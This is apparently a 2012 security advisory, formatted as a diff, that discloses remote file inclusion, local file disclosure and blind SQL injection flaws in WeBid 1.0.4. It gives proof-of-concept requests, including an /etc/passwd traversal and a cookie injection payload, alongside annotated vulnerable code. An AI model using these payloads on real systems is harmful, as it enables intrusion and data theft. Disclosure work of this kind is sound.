@@ -1,0 +1,166 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-08-17                              ]
+ ################################################
+ # [ WeBid <= 1.0.4 ] Multiple Vulnerabilities  #
+ ################################################
+ #
+ # Script: "Open source php/mysql fully featured auction script"
+ #
+ # Vendor:   http://www.webidsupport.com/
+ # Download: http://sourceforge.net/projects/simpleauction/files/simpleauction/
+ #
+ ################################################
+ # [RFI] ( allow_url_include = On; register_globals = On; )
+ # PoC: http://localhost/WeBid/loader.php?js=admin/logout.php&include_path=http://localhost/info.txt?
+ #
+ # File: ./WeBid/loader.php (lines: 15-60)
+ #  ..cut..
+ # ob_start('ob_gzhandler');
+ # header("Content-type: text/javascript");
+ # include 'includes/checks/files.php';               // 1 ( Definition of $file_hashs array )
+ # if (isset($_GET['js']))
+ # {
+ #    $js = explode(';', $_GET['js']);                // 3 js = admin/logout.php (for example) 
+ #    foreach ($js as $val)
+ #    {
+ #       $ext = substr($val, strrpos($val, '.') + 1); // 4
+ #       if ($ext == 'php')                           // 4
+ #       {
+ #          if (check_file($val))                     // 5
+ #          {
+ #             include $val;                          // 10 include admin/logout.php
+ #          }
+ #       }
+ #  ..cut..
+ #    }
+ # }
+ # ob_end_flush();
+ #
+ # function check_file($file)
+ # {
+ #    global $file_hashs;                             // 6
+ #    $tmp = $file_hashs;
+ #    $folders = explode('/', $file);                 // 7 $folders = Array([0] => admin, [1] => logout.php)
+ #    foreach ($folders as $val)                      // 8 This loop checks if parts of $folders are in $file_hashs
+ #    {
+ #       if (isset($tmp[$val]))
+ #       {
+ #          $tmp = $tmp[$val];
+ #       }
+ #       else
+ #       {
+ #          return false;
+ #       }
+ #    }
+ #    return true;                                    // 9 admin/logout.php passed
+ # }
+ #  ..cut..
+ #
+ # File: ./WeBid/includes/checks/files.php (lines: 2-19)
+ #  ..cut..
+ # $file_hashs = array(                                      // 2 List of files that can be included.
+ #  ..cut..
+ #    'admin' => array(                                      // 2 
+ #       'logout.php' => 'a0db39b73dcfd29feb1466002c4f59a4', // 2
+ #        ..cut..
+ #    ),
+ #  ..cut..
+ # );
+ #
+ # File: ./WeBid/admin/logout.php (lines: 16-17)
+ #  ..cut..                                           // 11 common.inc.php file contains a definition of $include_path
+ # include '../includes/common.inc.php';              // 11 Failed, because loader.php is in root path
+ # include $include_path . 'functions_admin.php';     // 12 *[RFI] $include_path is not set by script
+ #  ..cut..                                           // 12 If register_globals is On, we can set $include_path
+ #
+ ################################################
+ # [Local File Disclosure] ( magic_quotes_gpc = Off; php version < 5.3.4 )
+ # PoC: http://localhost/WeBid/getthumb.php?fromfile=getthumb.php&w=../../../../../etc/passwd%00
+ #
+ # File: ./WeBid/getthumb.php (lines: 17-52)
+ #  ..cut..
+ # $w = (isset($_GET['w'])) ? $_GET['w'] : '';                                      // 1
+ # $fromfile = (isset($_GET['fromfile'])) ? $_GET['fromfile'] : '';                 // 2
+ # $nomanage = false;
+ #  ..cut..
+ # if (!isset($_GET['fromfile']))                                                   // 3
+ # {
+ #    ErrorPNG('params empty');
+ #    exit;
+ # }
+ # elseif (!file_exists($_GET['fromfile']) && !fopen($_GET['fromfile'], 'r'))       // 4
+ # {
+ #    ErrorPNG('img does not exist');
+ #    exit;
+ # }
+ #
+ # if (file_exists($upload_path . 'cache/' . $_GET['w'] . '-' . md5($fromfile)))    // 5
+ # {
+ #    $img = getimagesize($fromfile);
+ #    if ($img[2] == 1)
+ #    {
+ #       $img['mime'] = 'image/png';
+ #    }
+ #    header('Content-type: ' . $img['mime']);
+ #    echo file_get_contents($upload_path . 'cache/' . $_GET['w'] . '-' . md5($fromfile)); // 6 *[LFD]
+ #    }
+ # }
+ #  ..cut..
+ #
+ ################################################
+ # [Blind SQL Injection] ( magic_quotes_gpc = Off; )
+ # PoC:
+ # http://localhost/WeBid/contents.php
+ # GET /WeBid/contents.php HTTP/1.1
+ # Host: localhost
+ # User-Agent: Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1
+ # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ # Accept-Language: pl,en-us;q=0.7,en;q=0.3
+ # Accept-Encoding: gzip, deflate
+ # Connection: keep-alive
+ # Cookie: WEBID_ONLINE=-1' OR 1=1--
+ #
+ # File: ./WeBid/contents.php (lines: 15, 38)
+ #  ..cut..
+ # include 'includes/common.inc.php';
+ #  ..cut..
+ # include 'header.php';                                        // 1
+ #  ..cut..
+ #
+ # File: ./WeBid/header.php (line: 26)
+ #  ..cut..
+ # $counters = load_counters();                                 // 2
+ #  ..cut..
+ #
+ # File: ./WeBid/includes/functions_global.php (line: 287-320)
+ #  ..cut..
+ # function load_counters()                                     // 3
+ # {
+ #  ..cut..
+ #      if (!$user->logged_in)
+ #      {
+ #         if (!isset($_COOKIE['WEBID_ONLINE']))
+ #         {
+ #            $s = md5(rand(0, 99) . session_id());
+ #            setcookie('WEBID_ONLINE', $s, time() + 900);
+ #         }
+ #         else
+ #         {
+ #            $s = $_COOKIE['WEBID_ONLINE'];                    // 4
+ #            setcookie('WEBID_ONLINE', $s, time() + 900);
+ #         }
+ #      }
+ #  ..cut..
+ #      $query = "SELECT id FROM " . $DBPrefix . "online WHERE SESSION = '$s'"; // 5 *[SQL]
+ #      $res = mysql_query($query);
+ #      $system->check_mysql($res, $query, __LINE__, __FILE__);
+ #  ..cut..
+ #
+ ### [ dun / 2012 ] #############################
